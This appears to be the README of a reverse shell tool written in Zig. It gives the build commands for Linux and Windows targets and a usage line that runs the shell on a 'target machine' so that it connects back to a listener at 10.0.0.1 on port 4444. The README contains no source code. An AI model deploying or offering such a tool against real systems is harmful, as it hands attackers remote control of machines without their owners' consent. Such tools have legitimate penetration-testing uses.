# Zig Reverse Shell 

## Download

<!-- Pre-compiled version is available in [releases](https://github.com/hideckies/xex/releases). -->

<br />

## Build from Source

Clone the repository and build for your target platform:

```sh
# Linux target
zig build -Dtarget=x86_64-linux

# Windows target
zig build -Dtarget=x86_64-windows
```

After that, the executable is generated under `zig-out/bin` directory.

<br />

## Usage

Execute the revshell in your target machine:

```sh
./revshell 10.0.0.1 4444
```